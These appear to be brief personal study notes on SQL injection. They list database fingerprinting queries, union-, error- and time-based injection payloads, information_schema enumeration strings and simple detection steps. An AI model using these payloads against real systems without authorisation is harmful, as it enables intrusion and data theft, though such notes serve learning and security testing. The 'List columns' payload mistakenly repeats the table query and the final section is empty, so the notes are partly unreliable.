# Techniques to identify the database and the commands for SQLinjection
---
1. Identify the database workspace.
   (e.g., MySQL, PostgreSQL, SQL Server, Oracle)

   start some basics commands to see it :
   SELECT 1: Checks if the database responds to a simple query. 
   SELECT @@version: Retrieves the version of the database (useful for identifying the database).

2. Common SQL injection Payloads.
   Union-based injec :
   ' UNION SELECT NULL, table_name FROM information_schema.tables --
   Error-based injec :
   ' AND 1=2 --
   Blind injec :
   ' AND SLEEP(5) --

   3. Test the schema.
    This schema is presented in many SQL databases, `information_schema`
*List databases*
  ' UNION SELECT NULL, database() --
*List tables*
  ' UNION SELECT NULL, table_name FROM information_schema.tables --
*List columns*
  ' UNION SELECT NULL, table_name FROM information_schema.tables --

***

# How to detect SQL injection vulnerabilities 
---

1. Use the single quote ' and see what happen.
2. Make test and see the time of responses so there is something.
3. boolean values 1=1 and some stuff like that.
4. OAST is a detector of vulnerabilities.

# Parts of appearance are vulnerabilities for injection.
---


